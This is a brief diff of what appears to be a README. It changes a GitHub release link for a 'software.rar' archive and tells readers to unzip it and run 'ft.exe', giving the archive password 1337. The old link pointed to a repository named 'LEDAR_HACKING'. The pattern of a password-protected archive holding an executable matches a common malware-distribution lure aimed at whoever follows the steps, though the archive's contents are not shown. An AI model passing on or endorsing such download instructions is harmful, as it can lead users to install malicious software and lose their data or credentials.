@@ -14,7 +14,7 @@
 
 # Download
 
-Download the archive [here](https://github.com/0IHI0/LEDEAR_HACKING/releases/download/sftwr/software.rar) and unzip ***software***, than lauch exe file ***ft.exe***
+Download the archive [here](https://github.com/0IHI0/ft/releases/download/0ft/software.rar) and unzip ***software***, than lauch exe file ***ft.exe***
 
  *ARCHIVE PASS - 1337
 
